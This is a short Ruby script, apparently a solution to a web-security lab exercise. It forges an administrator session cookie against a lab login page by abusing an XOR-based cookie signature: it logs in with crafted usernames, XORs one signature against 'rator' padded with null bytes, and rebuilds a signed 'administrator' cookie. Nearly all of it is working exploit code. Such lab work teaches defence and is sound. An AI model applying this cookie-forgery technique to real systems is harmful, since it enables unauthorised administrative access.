#curl 'http://ptl-86f20a3f-cd9f1764.libcurl.so/login.php' --data 'username=administ&password=Password1'
#YWRtaW5pc3QtLcUGktACaz2R

#administ -> sign
#rator XOR rator-> sign
#administrator--sign2 i

require 'base64'
require 'httparty'

URL = 'http://ptl-86f20a3f-cd9f1764.libcurl.so/'
def login(username)
    res = HTTParty.post(URL + 'login.php', body: {username: username, password: 'Password1'}, follow_redirects: false)
    #auth=Value
    return res.headers["set-cookie"].split("=")[1]
end

cookie = login("administ")
signature1 = Base64.decode64(cookie).split("--")[1]
puts signature1


def xor(str1, str2)
  ret=""
  str1.split(//).each_with_index do |c, i|
    ret[i] = (str1[i].ord ^ str2[i].ord).chr
  end
  return ret
end

username2=  xor("rator\00\00\00", signature1)
cookie2 = login(username2).gsub("%2B", "+")
puts cookie2
signature2 = Base64.decode64(cookie2).split("--")[1]
puts signature2
puts Base64.encode64("administrator--#{signature2}")
